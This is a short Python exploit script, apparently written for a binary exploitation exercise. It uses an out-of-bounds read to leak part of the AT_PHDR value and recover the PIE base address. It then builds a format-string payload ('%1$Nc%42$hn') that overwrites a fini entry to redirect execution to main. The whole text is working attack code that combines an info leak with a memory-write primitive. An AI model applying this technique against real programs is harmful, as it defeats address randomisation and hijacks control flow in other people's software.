import re,sys
from rprobe import run
# Y_pie from OOB read at idx=0x18a (b1 of AT_PHDR value = PIE+0x40)
lk,out=run(hex(0x18a),'%p','B'); b1=lk
pie_lo=(b1>>4)<<12
X=(pie_lo - 0x133) & 0xffff
print('b1=%#x -> PIE&0xffff=%#x -> X=%#x (fini target main)'%(b1,pie_lo,X))
f1='%%1$%dc%%42$hn'%X
print('f1=',f1,'len',len(f1))
lk2,out2=run('1',f1,'B')
print('OUT:',repr(out2[:200]))
